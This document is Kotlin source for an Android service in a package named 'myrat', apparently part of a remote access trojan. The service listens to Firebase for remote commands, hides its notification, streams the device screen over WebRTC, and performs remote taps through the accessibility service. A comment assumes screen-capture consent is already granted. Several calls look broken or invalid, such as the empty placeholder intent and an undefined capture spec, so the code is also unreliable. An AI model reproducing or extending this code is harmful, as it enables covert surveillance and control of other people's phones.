package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.media.projection.MediaProjection
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import org.webrtc.*
import java.util.concurrent.TimeUnit

class ScreenShareService : AccessibilityService() {
    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var peerConnection: PeerConnection? = null
    private var mediaProjection: MediaProjection? = null
    private var videoCapturer: ScreenCapturerAndroid? = null
    private val NOTIFICATION_ID = 6
    private val CHANNEL_ID = "ScreenShareService"

    override fun onCreate() {
        super.onCreate()
        deviceId = MainActivity.getDeviceId(this)
        Logger.log("ScreenShareService started for deviceId: $deviceId")
        startForegroundService()
        listenForScreenShareCommands()
    }

    private fun startForegroundService() {
        val channelName = "Screen Sharing Service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                CHANNEL_ID,
                channelName,
                android.app.NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            (getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Sharing Service")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun listenForScreenShareCommands() {
        val screenShareRef = db.child("Device").child(deviceId).child("screenShare")
        screenShareRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                try {
                    val startScreenShare = snapshot.child("startScreenShare").getValue(Boolean::class.java) ?: false
                    val stopScreenShare = snapshot.child("stopScreenShare").getValue(Boolean::class.java) ?: false

                    if (startScreenShare) {
                        Logger.log("Command received: Start screen sharing")
                        startScreenSharing()
                        screenShareRef.child("startScreenShare").setValue(false)
                    } else if (stopScreenShare) {
                        Logger.log("Command received: Stop screen sharing")
                        stopScreenSharing()
                        screenShareRef.child("stopScreenShare").setValue(false)
                    }
                } catch (e: Exception) {
                    Logger.log("Error processing screen share commands: ${e.message}")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.log("Failed to read screen share command: ${error.message}")
            }
        })

        // Listen for input commands
        val inputCommandsRef = db.child("Device").child(deviceId).child("inputCommands")
        inputCommandsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val data = snapshot.getValue(Map::class.java) ?: return
                    val type = data["type"] as? String
                    val inputData = data["data"] as? Map<*, *>
                    if (type == "click" && inputData != null) {
                        val x = (inputData["x"] as? Number)?.toFloat() ?: 0f
                        val y = (inputData["y"] as? Number)?.toFloat() ?: 0f
                        performClick(x, y)
                    }
                    // Clear command after processing
                    inputCommandsRef.setValue(null)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.log("Failed to read input command: ${error.message}")
            }
        })
    }

    private fun startScreenSharing() {
        scope.launch {
            try {
                // Initialize WebRTC
                PeerConnectionFactory.initialize(
                    PeerConnectionFactory.InitializationOptions.builder(this@ScreenShareService)
                        .createInitializationOptions()
                )
                val iceServers = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
                peerConnection = PeerConnectionFactory().createPeerConnection(iceServers, object : PeerConnection.Observer {
                    override fun onIceCandidate(candidate: IceCandidate) {
                        db.child("Device").child(deviceId).child("screenShare/iceCandidates").push().setValue(candidate)
                    }
                    override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
                    override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
                    override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
                    override fun onAddStream(stream: MediaStream?) {}
                    override fun onRemoveStream(stream: MediaStream?) {}
                    override fun onDataChannel(channel: DataChannel?) {}
                    override fun onRenegotiationNeeded() {}
                    override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
                })

                // Setup screen capture (assumes MediaProjection permission is pre-granted)
                val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                // Note: MediaProjection requires user interaction for first-time setup. Assuming pre-granted for this context.
                // In a production app, you may need to handle this via an Activity.
                val intent = Intent() // Placeholder; actual intent requires user interaction unless pre-granted
                mediaProjection = mediaProjectionManager.getMediaProjection(-1, intent)
                videoCapturer = ScreenCapturerAndroid(mediaProjection, object : MediaProjection.Callback() {})
                val videoSource = PeerConnectionFactory().createVideoSource(videoCapturer.isScreencast)
                videoCapturer?.initialize(
                    SurfaceTextureHelper.create("VideoCaptureThread", EglBase.create().eglBaseContext),
                    this@ScreenShareService,
                    video.NormalizedCaptureSpec()
                )
                val videoTrack = PeerConnectionFactory().createVideoTrack("screen", videoSource)
                peerConnection?.addTrack(videoTrack)

                // Handle SDP offer
                val screenShareRef = db.child("Device").child(deviceId).child("screenShare")
                screenShareRef.child("sdpOffer").addValueEventListener(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val sdpOffer = snapshot.getValue(Map::class.java)
                        if (sdpOffer != null) {
                            val sessionDescription = SessionDescription(SessionDescription.Type.OFFER, sdpOffer["sdp"] as String)
                            peerConnection?.setRemoteDescription(object : SdpObserver {
                                override fun onCreateSuccess(sdp: SessionDescription?) {}
                                override fun onSetSuccess() {
                                    val answer = peerConnection?.createAnswer()
                                    peerConnection?.setLocalDescription(object : SdpObserver {
                                        override fun onCreateSuccess(sdp: SessionDescription?) {
                                            screenShareRef.child("sdpAnswer").setValue(sdp)
                                        }
                                        override fun onSetSuccess() {}
                                        override fun onCreateFailure(error: String?) {}
                                        override fun onSetFailure(error: String?) {}
                                    })
                                }
                                override fun onCreateFailure(error: String?) {}
                                override fun onSetFailure(error: String?) {}
                            }, sessionDescription)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        Logger.log("Failed to read SDP offer: ${error.message}")
                    }
                })

                videoCapturer?.startCapture(1280, 720, 30)
                screenShareRef.child("isScreenSharing").setValue(true)
                Logger.log("Screen sharing started")
            } catch (e: Exception) {
                Logger.log("Error starting screen sharing: ${e.message}")
            }
        }
    }

    private fun stopScreenSharing() {
        scope.launch {
            try {
                videoCapturer?.stopCapture()
                videoCapturer?.dispose()
                mediaProjection?.stop()
                peerConnection?.close()
                videoCapturer = null
                mediaProjection = null
                peerConnection = null
                db.child("Device").child(deviceId).child("screenShare/isScreenSharing").setValue(false)
                Logger.log("Screen sharing stopped")
            } catch (e: Exception) {
                Logger.log("Error stopping screen sharing: ${e.message}")
            }
        }
    }

    private fun performClick(x: Float, y: Float) {
        scope.launch {
            try {
                val path = Path().apply {
                    moveTo(x, y)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                    .build()
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        Logger.log("Click performed at ($x, $y)")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Logger.log("Click cancelled at ($x, $y)")
                    }
                }, null)
            } catch (e: Exception) {
                Logger.log("Error performing click: ${e.message}")
            }
        }
    }

    override fun onServiceConnected() {
        Logger.log("ScreenShareService connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        stopScreenSharing()
        scope.cancel()
        Logger.log("ScreenShareService destroyed")
    }
}